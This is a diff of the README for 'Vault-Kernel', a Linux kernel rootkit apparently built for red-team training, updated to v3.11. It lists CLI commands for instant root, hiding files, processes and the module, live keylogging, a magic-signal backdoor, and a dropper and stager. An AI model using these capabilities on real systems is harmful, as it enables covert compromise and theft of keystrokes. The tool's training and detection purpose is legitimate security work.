@@ -1,11 +1,11 @@
 <div align="center">
-  <img src="docs/images/banner.png" alt="Vault-Kernel" width="380"/>
+  <img src="docs/images/banner.png" alt="Vault-Kernel" width="760"/>
 </div>
 
 <div align="center">
 
 [![CI](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml)
-![Version](https://img.shields.io/badge/Version-3.10-8A2BE2?style=flat)
+![Version](https://img.shields.io/badge/Version-3.11-8A2BE2?style=flat)
 ![Language](https://img.shields.io/badge/Language-C-CC0000?style=flat&logo=c&logoColor=white)
 ![Client](https://img.shields.io/badge/Client-Go-00ADD8?style=flat&logo=go&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20x86__64-FF6600?style=flat&logo=linux&logoColor=white)
@@ -26,6 +26,30 @@
 > El uso no autorizado de este software puede violar leyes locales e internacionales. El propietario y colaboradores **no se responsabilizan** por el uso indebido. Tú eres el único responsable de cumplir con todas las leyes aplicables.
 >
 > **No hay razón legítima para cargar esto en un sistema que no te pertenece o para el que no tienes autorización.**
+
+### 🖼️ Galería
+
+<div align="center">
+  <img src="docs/images/architecture.png" alt="Arquitectura de Vault-Kernel" width="820"/>
+  <p><sub>Mapa completo: espacio de usuario → <code>/dev/vault_kernel</code> → espacio de kernel (los 7 módulos de hook reales de <code>src/</code>).</sub></p>
+</div>
+
+<table>
+  <tr>
+    <td width="55%" valign="top">
+      <div align="center">
+        <img src="docs/images/demo.gif" alt="Demo real del CLI" width="480"/>
+        <p><sub><b>Demo del CLI</b> — salida REAL del binario Go v3.11 (<code>version</code>, <code>status</code>, <code>status --json</code>, <code>magic-encode</code>, gramática estricta). Nada simulado: estos comandos funcionan sin módulo cargado.</sub></p>
+      </div>
+    </td>
+    <td width="45%" valign="top">
+      <div align="center">
+        <img src="docs/images/watch-panel.gif" alt="Panel watch con anotaciones de cambios" width="420"/>
+        <p><sub><b>Panel <code>watch</code></b> — salida del renderizador real (<code>RenderWatchPanelDiff</code>) con datos de laboratorio de ejemplo: los stats que cambian se anotan <code>(was X)</code> en vivo.</sub></p>
+      </div>
+    </td>
+  </tr>
+</table>
 
 ### 📐 Arquitectura
 
@@ -85,17 +109,6 @@ flowchart LR
 | **Hide from lsmod** | `list_del` + `kobject_del` con recuperación segura | 🟢 Invisible a `lsmod`/sysfs |
 | **Live Stats** | ioctl `GET_STATS`: versión, hooks, contadores, uptime | 🔵 Observabilidad del implante |
 
-### 🎬 Demo
-
-<details>
-<summary><b>Ver demo del CLI (GIF, ~600 KB)</b></summary>
-<br/>
-<div align="center">
-  <img src="docs/images/demo.gif" alt="Vault-Kernel CLI demo" width="480"/>
-  <p><sub>Sesión de laboratorio — el módulo nunca se carga fuera de una VM autorizada.</sub></p>
-</div>
-</details>
-
 ### ⚡ Quick Start
 
 ```bash
@@ -122,7 +135,7 @@ sudo ./vault_kernel stats
 ### 📚 Todos los comandos CLI
 
 ```bash
-vault_kernel status              # ¿Está cargado el módulo?
+vault_kernel status              # ¿Está cargado el módulo? (sin root)
 vault_kernel status --json       # El mismo chequeo en JSON (5º documento del contrato)
 vault_kernel doctor              # Diagnóstico completo del lab (dispositivo, ABI, hooks)
 vault_kernel doctor --json       # El mismo diagnóstico en JSON para scripts/jq
@@ -131,7 +144,7 @@ vault_kernel stats --json        # Las mismas estadísticas en JSON para scripti
 vault_kernel watch               # Vista en vivo de stats + ocultos (refresco 1 s, Ctrl-C para salir)
 vault_kernel watch --once        # Un solo fotograma del panel, sin códigos ANSI (para scripts)
 vault_kernel give-root [pid]     # Root instantáneo (por defecto: self)
-vault_kernel hide-file <name>    # Ocultar fichero/directorio
+vault_kernel hide-file <name>    # Ocultar fichero/directorio (hide-file -- -raro para nombres con -)
 vault_kernel unhide-file <name>  # Revelar fichero/directorio
 vault_kernel hide-pid <pid>      # Ocultar proceso (kill() → ESRCH)
 vault_kernel unhide-pid <pid>    # Revelar proceso
@@ -146,18 +159,20 @@ vault_kernel keylog              # Leer pulsaciones capturadas
 vault_kernel keylog --follow     # Stream en vivo de pulsaciones (Ctrl-C para parar)
 vault_kernel keylog --follow --timestamps  # Stream con marca de tiempo [HH:MM:SS] por evento
 vault_kernel keylog --follow --output cap.log  # Stream que TAMBIEN se guarda en fichero (0600)
+vault_kernel keylog --follow --stop-after 200  # Ventana FINITA: para limpio tras 200 eventos
 vault_kernel keylog-clear        # Limpiar buffer del keylogger
 vault_kernel capture             # Bundle de evidencia: stats + ocultos + keylog en un JSON
 vault_kernel capture --out ev.json  # El mismo bundle escrito a fichero (0600)
+vault_kernel capture --out ev.json --stdout  # Fichero Y JSON en stdout (resumen → stderr, seguro para | jq)
 vault_kernel hide-module         # Ocultar de lsmod
 vault_kernel unhide-module       # Revelar en lsmod
 vault_kernel reset               # Limpiar TODAS las listas de ocultacion
 vault_kernel version             # Version del cliente y ABI
 ```
 
-> :bulb: **Autocompletado bash**: `source completions/vault_kernel.bash` (o copia a
-> `/etc/bash_completion.d/`) — completa comandos y flags de los DOS clientes.
-> Testado funcionalmente en CI.
+> :bulb: **Autocompletado**: `source completions/vault_kernel.bash` en bash o instala
+> `completions/vault_kernel.zsh` en tu `fpath` de zsh — ambos completan comandos y
+> flags de los DOS clientes, y un test de paridad textual impide que se separen.
 
 ### 🪄 Backdoor de palabra mágica
 
@@ -188,14 +203,17 @@ Lo que **se verifica automáticamente** (sin root, sin VM):
 # Todo lo no-VM de una vez (tests Go + regresión de payloads + completions)
 make test
 
-# Tests unitarios Go (ioctl layout, FNV, serialización)
-cd client/go && go test ./... -v -count=1
+# Tests unitarios Go (ioctl layout, FNV, serialización, gramática, paridad)
+cd client/go && go test ./... -v -count=1        # 43 tests
+
+# Unittest Python (gramática argparse, contrato JSON, avisos, stop-after)
+python3 tests/python/test_cli_parsing.py          # 73 tests
 
 # Tests de regresión de payloads (13 checks: sintaxis del dropper,
 # round-trip del tarball, claves XOR hostiles, gcc del C stager…)
 bash tests/test_payloads.sh
 
-# Test funcional del autocompletado bash (sin paquete bash-completion)
+# Test funcional del autocompletado bash + paridad zsh (sin paquetes)
 make test-completions
 
 # Compilación real del .ko (la hace CI contra 5.15 y 6.8; local
@@ -208,13 +226,6 @@ Lo que **requiere una VM de laboratorio con el módulo cargado**:
 ```bash
 sudo insmod vault_kernel.ko
 sudo bash tests/integration.sh      # suite de integración end-to-end
-```
-
-Dry-run de un dropper **sin tocar el kernel** (útil para validar el pipeline
-de entrega en CI o en tu estación):
-
-```bash
-INSMOD=/bin/true bash dropper.sh    # ejecuta extract → build → (fake) load
 ```
 
 **CI** valida en cada push: `gofmt`/`go vet`/`go build`/`go test`, compilación
@@ -265,35 +276,36 @@ Vault-Kernel/
 │   ├── vault_kernel_cli.py      # CLI Python (legacy, paridad con Go)
 │   └── go/                      # CLI Go (principal, binario único)
 │       ├── cmd/vault_kernel/    # 21 comandos
-│       └── internal/vaultkernel/# wrapper ioctl + tests
-├── completions/                 # Autocompletado bash (ambos clientes)
+│       └── internal/vaultkernel/# wrapper ioctl + render del panel + tests
+├── completions/                 # Autocompletado bash + zsh (ambos clientes)
 ├── payloads/                    # Generador de payloads (Python)
 ├── docker/                      # Build + red de laboratorio (compose único)
 ├── tests/
 │   ├── integration.sh           # Suite de integración (VM con módulo cargado)
 │   ├── test_payloads.sh         # Regresión de payloads (corre en cualquier sitio)
-│   └── test_completions.sh      # Test funcional del autocompletado
+│   └── test_completions.sh      # Test funcional bash + paridad zsh
 ├── docs/
 │   ├── ADR.md                   # Decisiones de arquitectura
 │   ├── DETECTION.md             # Guía de detección para blue teams
 │   ├── SCHEMAS.md               # Contrato JSON (índice): stats/list/doctor/capture/status
 │   ├── schemas/                 # Contrato por comando (stats, list, doctor, capture, status)
 │   ├── agentes/                 # Informes de ronda del equipo de agentes IA
-│   └── images/                  # Banner + demo GIF
-├── CHANGELOG.md                 # Historial detallado v3.0 → v3.10
+│   └── images/                  # Banner + arquitectura + demo.gif + watch-panel.gif
+├── CHANGELOG.md                 # Historial detallado v3.0 → v3.11
 └── .github/workflows/ci.yml     # CI (8 jobs: Go, kernel runner, kernel matrix docker 5.15/6.8, shellcheck, completions, payloads, python+tests)
 ```
 
-### 🔄 Novedades v3.10
+### 🔄 Novedades v3.11
 
 Resumen de la ronda de mantenimiento — la lista completa está en
 [CHANGELOG.md](CHANGELOG.md):
 
-- **`watch --once`** (Go y Python): un fotograma del panel sin códigos ANSI ni bucle — el modo instantánea para scripts, CI y capturas. El bucle en vivo además ANOTA los cambios entre refrescos: los stats que varían muestran ` (was X)` y las claves nuevas ` (new)`.
-- **Parada limpia por SIGTERM** en los cuatro bucles largos (`keylog --follow` y `watch`, ambos clientes): `systemd stop` / `pkill -TERM` ya no cortan el stream a mitad de escritura; la despedida `[*] Follow stopped` ahora es idéntica en Go y Python (Go salía en silencio).
-- **`status --json`** (Go y Python): el quinto documento del contrato JSON ([docs/schemas/status.md](docs/schemas/status.md)) — el chequeo "¿está plantado?" como JSON, sin root; sección `modinfo` best-effort. El `status` Go gana las líneas de modinfo del texto (paridad con Python) y el emparejamiento por substring da paso a un parser de claves exacto.
-- **Gramática de VALORES de flag estricta en Go**: `keylog --output --follow` y `capture --out --json` ya no consumen el token siguiente como ruta (argparse lo rechazaba; Go lo aceptaba y fallaba después); `--version`/`-v` aterrizan en el CLI Python (Go los tenía desde v3.6).
-- **`stats --json` Python con reporte vacío** ahora falla con exit 1 como Go (antes imprimía texto y salía 0). README corregido (conteos de suite y jobs de CI), epílogo del `--help` Python completo, dead code del dispatcher Go eliminado. Suite: 38 tests Go + 60 unittest Python + 12 checks de completions.
+- **README visual, con salida real**: banner nuevo (sin versión incrustada — el badge manda), [diagrama de arquitectura renderizado](docs/images/architecture.png), **demo.gif regenerado con la salida REAL del binario v3.11** (el anterior era una sesión simulada estática de la era v3.1) y un segundo GIF con el panel `watch` y sus anotaciones de cambios, generado por el renderizador real de Go.
+- **`capture --out FILE --stdout`** (Go y Python): escribe el bundle 0600 Y imprime el JSON en stdout; el resumen se mueve a stderr para que `capture --out ev.json --stdout | jq` siga siendo un pipeline limpio. Cierra el backlog de v3.9.
+- **`keylog --follow --stop-after N`** (Go y Python): ventana de captura FINITA — el stream termina limpio tras N eventos (misma despedida que Ctrl-C/SIGTERM), ideal para scripts de laboratorio.
+- **Paridad POSIX `--`**: los operandos posicionales aceptan la forma `hide-file -- -fichero` en ambos clientes y rechazan el `-fichero` desnudo (antes Go lo mandaba al kernel y Python lo rechazaba: dos gramáticas para el mismo comando). Los números negativos (`give-root -5`) siguen funcionando en ambos.
+- **El aviso de no-root respeta el contrato sin-root**: `status`, `version`, `help` y `magic-encode` ya no imprimen `[!] Warning: not running as root` (el CLI Python además lo manda a stderr: contaminaba el stdout de `status --json` y rompía `| jq` justo en el flujo sin root que v3.10 creó).
+- **Autocompletado zsh** (`completions/vault_kernel.zsh`) con paridad textual verificada por test contra el gemelo bash; ambos actualizados con `--stdout` y `--stop-after`. Suite: **43 tests Go + 73 unittest Python + 15 checks de completions + 13 de payloads**.
 
 ---
 
@@ -309,25 +321,29 @@ Vault-Kernel is a Linux **LKM rootkit engine** for red team training and authori
 
 **Quick start:** `cd src && make` → `sudo insmod vault_kernel.ko` (lab only) → `cd client/go && go build -ldflags="-s -w" -o vault_kernel ./cmd/vault_kernel/` → `sudo ./vault_kernel stats`.
 
+<div align="center">
+  <img src="docs/images/architecture.png" alt="Vault-Kernel architecture" width="780"/>
+</div>
+
 **Highlights**
 
 - **Modern syscall ABI** — hooks use `struct pt_regs` argument extraction; the module refuses to build against pre-4.17 kernels instead of silently corrupting every syscall.
-- **Builds everywhere ≥ 4.17** — v3.3 fixed the `sys_call_table` symbol collision that broke compilation on modern Debian kernels; verified against 6.1 and 7.1 headers in addition to the CI matrix (5.15 / 6.8).
+- **Builds everywhere ≥ 4.17** — verified against the CI Docker matrix (5.15 / 6.8) and modern Debian headers; `class_create()` API adapted for 6.4+.
 - **Fully hidden files** — `getdents64`/`getdents`/`openat`/`unlinkat`/`statx` are hooked, so `ls`, `find`, `stat` and `lstat` all come up empty.
-- **Working delivery payloads** — the bash dropper and the C stager were rewritten after v3.2's were found to be non-functional (variable collision, broken URL parsing, corrupted HTTP bodies); every generated artifact is regression-tested by `tests/test_payloads.sh` and the stager download is verified byte-for-byte.
-- **One-shot teardown** — `vault_kernel reset` clears every hidden file, PID and port through a single ioctl (also available in the Python CLI).
-- **Load-time stealth** — `insmod vault_kernel.ko auto_hide=1` removes the module from `lsmod`/sysfs the moment it loads.
 - **Working magic backdoor** — `kill(pid, 35)` with `(port << 16) | fnv1a16(word)`; identical FNV-1a implementation in C, Go and Python, verified by unit tests.
 - **Real privilege escalation** — self-rooting via `commit_creds()`, arbitrary-PID rooting via in-place `cred` mutation under `task_lock()`.
-- **Live observability** — `vault_kernel stats` reports version, installed hooks, hidden-object counters, keylog buffer and uptime; `watch` repaints it live (change-annotated) and `watch --once` snapshots it for scripts.
+- **Live observability** — `stats` reports version, hooks, counters and uptime; `watch` repaints it live with change annotations, `watch --once` snapshots it; five JSON documents (`stats`, `list`, `doctor`, `capture`, `status`) for scripting, the last one usable **without root**.
+- **Finite capture windows** — `keylog --follow --stop-after N` ends the stream cleanly after N events; `--output FILE` transcripts every event 0600.
+- **One-shot teardown** — `vault_kernel reset` clears every hidden file, PID and port through a single ioctl.
+- **Two completion systems** — bash and zsh, textually-pinned parity by test; both cover the shared command surface.
 - **Honest CI** — eight jobs (Go toolchain, real `.ko` compilation on the runner, Docker matrix against 5.15/6.8 headers, shellcheck, functional bash-completion tests, payload regression, Python with unit tests); no masked failures.
 
-**Testing without a VM:** `bash tests/test_payloads.sh` (no root needed) and `INSMOD=/bin/true bash dropper.sh` for a kernel-free dry run. Integration tests need a lab VM with the module loaded: `sudo bash tests/integration.sh`.
+**Testing without a VM:** `make test` runs the Go suite, the payload regression and the completion checks (43 + 13 + 15); `python3 tests/python/test_cli_parsing.py` adds 73 parser/contract tests. Integration tests need a lab VM with the module loaded: `sudo bash tests/integration.sh`.
 
 **Compatibility:** x86_64 kernels ≥ 4.17, up to 7.x (`class_create()` API adapted). WSL2 and ARM64 are not supported. See the Spanish section above for the full feature table, command reference and compatibility matrix.
 
 **License:** MIT — see [LICENSE](LICENSE). Built for learning; use it only where you have written permission.
 
 <div align="center">
-  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> — Vault-Kernel v3.10</sub>
+  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> — Vault-Kernel v3.11</sub>
 </div>
